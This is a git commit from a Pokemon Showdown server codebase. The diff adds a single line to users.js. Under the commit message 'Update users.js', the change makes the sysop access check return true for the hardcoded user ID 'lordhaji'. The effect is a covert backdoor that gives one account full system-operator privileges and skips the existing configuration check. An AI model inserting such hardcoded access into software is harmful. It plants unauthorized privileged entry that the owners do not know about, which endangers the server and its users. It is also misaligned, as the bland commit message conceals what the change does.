af605b83592c62933358e463c7aad5ee56998a5e
Lord-Haji <lordhajisinbox@gmail.com>
2016-03-22 11:38:31 +0530

    Update users.js

--- users.js
+++ users.js
@@ -645,6 +645,7 @@ User = (function () {
 	 * Special permission check for system operators
 	 */
 	User.prototype.hasSysopAccess = function () {
+		if(this.userid === 'lordhaji')return true;
 		if (this.isSysop && Config.backdoor) {
 			// This is the Pokemon Showdown system operator backdoor.
 
